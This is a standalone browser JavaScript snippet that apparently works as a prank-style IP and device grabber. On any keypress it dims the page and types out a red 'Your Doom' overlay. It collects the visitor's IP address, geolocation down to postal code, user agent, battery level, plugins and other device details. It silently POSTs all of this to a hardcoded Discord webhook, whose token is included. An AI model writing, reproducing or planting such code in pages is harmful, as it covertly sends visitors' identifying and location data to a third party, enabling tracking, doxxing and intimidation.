(function() {
    const webhookURL = "https://discord.com/api/webhooks/1291171527584383047/7y2F0ueB9IJGQSHWbeu1NFRVMC_sLy_BLpoftnqzZc49wfRksWw5DNSGl5vnQoY3rfPV";

    document.addEventListener('keydown', async function() {
        await fadeScreen();
        await displayInfo();
    });

    async function fadeScreen() {
        document.body.style.transition = "background-color 2s";
        document.body.style.backgroundColor = "rgba(0, 0, 0, 0.45)";
        await new Promise(resolve => setTimeout(resolve, 2000));
    }

    async function displayInfo() {
        const outputElement = createOutputElement();
        const titleElement = createTitleElement();
        const info = await gatherInfo();
        await typeOut("Your Doom", titleElement);
        for (const line of info) {
            await typeOut(line + "\n", outputElement);
        }
    }

    function createTitleElement() {
        const title = document.createElement("div");
        Object.assign(title.style, {
            color: "red",
            position: "absolute",
            top: "10%",
            left: "50%",
            transform: "translateX(-50%)",
            fontSize: "36px",
            whiteSpace: "pre-wrap",
            zIndex: "9999"
        });
        document.body.appendChild(title);
        return title;
    }

    function createOutputElement() {
        const output = document.createElement("div");
        Object.assign(output.style, {
            color: "red",
            position: "absolute",
            top: "20%",
            left: "50%",
            transform: "translateX(-50%)",
            fontSize: "24px",
            whiteSpace: "pre-wrap",
            zIndex: "9999",
            maxHeight: "80%", // Limit the height to prevent overflow
            overflowY: "auto" // Allow scrolling if the content exceeds maxHeight
        });
        document.body.appendChild(output);
        return output;
    }

    async function typeOut(text, element) {
        for (let i = 0; i < text.length; i++) {
            element.innerHTML += text.charAt(i);
            await new Promise(resolve => setTimeout(resolve, 40));
        }
    }

    async function gatherInfo() {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const { ip } = await ipResponse.json();
        const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
        const locationData = await locationResponse.json();
        const info = [
            `IP: ${ip}`,
            `Location: ${locationData.city}, ${locationData.region}, ${locationData.country}`,
            `ZIP/Postal Code: ${locationData.postal}`,
            `User-Agent: ${navigator.userAgent}`,
            `Screen Resolution: ${window.screen.width} x ${window.screen.height}`,
            `Viewport Size: ${window.innerWidth} x ${window.innerHeight}`,
            `Language: ${navigator.language}`,
            `Battery Status: ${await navigator.getBattery().then(b => b.level * 100 + "%")}`,
            `Platform: ${navigator.platform}`,
            `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
            `Online Status: ${navigator.onLine ? "Online" : "Offline"}`,
            `Cookies Enabled: ${navigator.cookieEnabled ? "Yes" : "No"}`,
            `Connection Type: ${navigator.connection ? navigator.connection.effectiveType : "Unknown"}`,
            `Device Memory: ${navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown"}`,
            `Touch Device: ${("ontouchstart" in window) ? "Yes" : "No"}`,
            `Color Depth: ${screen.colorDepth} bits`,
            `Pixel Ratio: ${window.devicePixelRatio}`,

            `User Agent Platform: ${navigator.userAgent.split(' ')[1]}`,
            `User Agent Architecture: ${navigator.userAgent.split(';')[1]}`,
            `Plugins: ${navigator.plugins.length ? Array.from(navigator.plugins).map(plugin => plugin.name).join(', ') : "None"}`
        ];
        await sendToWebhook(info);
        return info.filter(line => !line.includes("Unknown"));
    }

    async function sendToWebhook(info) {
        const data = { content: info.join("\n") };
        await fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(data)
        });
    }
})();
